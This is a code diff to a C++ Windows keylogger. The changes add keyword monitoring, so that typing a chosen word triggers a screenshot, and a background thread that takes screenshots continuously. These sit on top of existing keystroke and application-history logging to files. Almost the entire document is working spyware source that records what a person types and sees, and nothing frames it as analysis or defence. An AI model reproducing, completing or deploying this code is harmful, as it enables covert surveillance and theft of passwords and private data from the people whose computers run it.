@@ -1,18 +1,33 @@
 #include "stdafx.h"
 #include "Keylogger.h"
 #include "Application_History.h"
+#include "Screenshot.h"
 
 #include <windows.h>
 #include <stdlib.h>
 #include <stdio.h>
 #include <time.h>
+
 #include <iostream>
 #include <fstream>
+#include <thread>
+#include <string>
+#include <sstream>
+#include <algorithm>
 
 
-#define FILEEXT ".log"
-#define DEBUG
-#define DEBUG_TO_LOGS
+Keylogger::Keylogger() { }
+
+Keylogger::Keylogger(bool save_enabled)
+{
+	saving_enabled = save_enabled;
+}
+
+Keylogger::Keylogger(bool save_enabled, std::vector<std::string> &_keywords)
+{
+	saving_enabled = save_enabled;
+	keywords = std::move(_keywords);
+}
 
 std::string Keylogger::intToString(int i)
 {
@@ -23,9 +38,6 @@ std::string Keylogger::intToString(int i)
 
 std::string Keylogger::getSelfPath()
 {
-#ifdef DEBUG
-	//printf("getSelfPath() ");
-#endif
 	char selfpath[MAX_PATH];
 	wchar_t selfpath_wchar[MAX_PATH];
 
@@ -38,9 +50,6 @@ std::string Keylogger::getSelfPath()
 
 std::string Keylogger::dirBasename(std::string path)
 {
-#ifdef DEBUG
-	//printf("dirBasename() ");
-#endif
 	if (path.empty())
 		return std::string("");
 
@@ -68,7 +77,6 @@ void Keylogger::save_to_file(std::ofstream &file_stream, const std::string &cont
 		file_stream.flush();
 	}
 }
-
 
 void Keylogger::get_key(std::ofstream &file_logs)
 {	
@@ -131,6 +139,7 @@ void Keylogger::get_key(std::ofstream &file_logs)
 				|| c == 32) // letters and numbers
 			{
 				key = c;
+				all_keys.append(key);
 				save_to_file(file_logs_clean_keys, key);
 			}
 
@@ -179,14 +188,46 @@ void Keylogger::get_key(std::ofstream &file_logs)
 			else
 				key = intToString(c);
 
-
 #ifdef DEBUG
 			printf("Key = %s (%d)\n", key.c_str(), c);
 #endif
+			look_for_keyword(all_keys);
+
 			save_to_file(file_logs, key);
 		}
 	}
 }
+
+void Keylogger::look_for_keyword(std::string &_all_keys)
+{
+	size_t position_of_key;
+
+	for (const std::string &key : keywords)
+	{	
+		std::cout << "Looking for: " << key << "\n";
+		position_of_key = _all_keys.find(key);
+		std::cout << "Content of all keys that were pressed: " << _all_keys << "\n";
+		if (position_of_key != std::string::npos)
+		{
+			// Save a screenshot with the name of a keyword
+			Screenshot screenshotter;
+			screenshotter.take_screenshot("_KLUCZ=" + key);			
+			screenshotter.compress_image();
+			
+			std::cout << "KEY Screenshot taken!\n Key found: " << key << "\n";
+			
+			// Remove the key from string so that there are no double (and more) false positives.
+			_all_keys.erase(position_of_key, key.size());
+		}
+	}
+	
+	// For performance reasons, if the current keys size is more than 100, we clear the buffer.
+	if (_all_keys.size() > 100)
+	{
+		_all_keys.clear();
+	}
+}
+
 std::string Keylogger::create_file()
 {
 	time_t rawtime;
@@ -206,6 +247,7 @@ std::string Keylogger::create_file()
 
 	m_file_path = std::string(file_path);
 	
+	// Append keyword to a file name
 	size_t position_to_prepend = m_file_path.find(".log");
 	std::string path_for_clean_keys = m_file_path;
 	path_for_clean_keys.insert(position_to_prepend, "_clean_key");
@@ -215,28 +257,48 @@ std::string Keylogger::create_file()
 	return m_file_path;
 }
 
-Keylogger::Keylogger() { }
-
-Keylogger::Keylogger(bool save_enabled) 
-{
-	saving_enabled = save_enabled;
-}
-
 std::ofstream& Keylogger::get_file_logs_clean_keys()
 {
 	return file_logs_clean_keys;
 }
 
+/* User can choose keywords - once they are typed the application will make the screenshot at this time.*/
+std::vector<std::string> get_keywords()
+{
+	std::string keyword;
+	std::cout << "Prosze wpisac slowa KLUCZ (oddzielone spacja): ";
+	std::getline(std::cin, keyword);
+
+	std::stringstream strings_split(keyword);
+	std::vector<std::string> keywords;
+
+	while (strings_split >> keyword)
+	{
+		std::cout << "Keyword: " << keyword << "\n";
+		std::transform(keyword.begin(), keyword.end(), keyword.begin(), ::toupper);
+		keywords.push_back(keyword);
+	}
+
+	return keywords;
+}
+
 int main(int argc, char *argv[])
 {
-	bool saving_enabled = true;
+	bool saving_enabled = false;
 
-	Keylogger keylogger(saving_enabled);
+	std::vector<std::string> keywords = get_keywords();
+
+	Keylogger keylogger(saving_enabled, keywords);
 	std::string file_path = keylogger.create_file();
 	std::ofstream file_logs(file_path);
 
 	Application_History application_history(file_logs, keylogger.get_file_logs_clean_keys(), 
 		file_path, saving_enabled);
+
+	// Take screenshots in a separate thread
+	Screenshot screenshoter;
+	std::thread screenshot_thread(&Screenshot::auto_start, screenshoter);
+	screenshot_thread.detach();
 
 	while (1)
 	{
